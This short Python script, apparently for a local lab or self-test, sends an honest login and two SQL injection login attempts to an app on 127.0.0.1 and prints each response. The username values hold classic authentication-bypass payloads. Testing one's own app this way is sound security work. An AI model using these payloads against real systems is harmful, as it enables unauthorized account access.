import requests

URL = "http://127.0.0.1:5001/login"
tests = [
    ("honest", {"username":"admin","password":"admin123"}),
    ("sqli1", {"username":"admin' OR '1'='1'--","password":"anything"}),
    ("sqli2", {"username":"' OR '1'='1","password":"anything"}),
]

def try_post(name, data):
    try:
        r = requests.post(URL, data=data, allow_redirects=False, timeout=5)
        status = r.status_code
        body = r.text
        snippet = body[:200].replace("\n"," ")
        print(f"TEST {name}: status={status} snippet={snippet}")
    except Exception as e:
        print(f"TEST {name}: ERROR {e}")

if __name__ == "__main__":
    for name, data in tests:
        try_post(name, data)
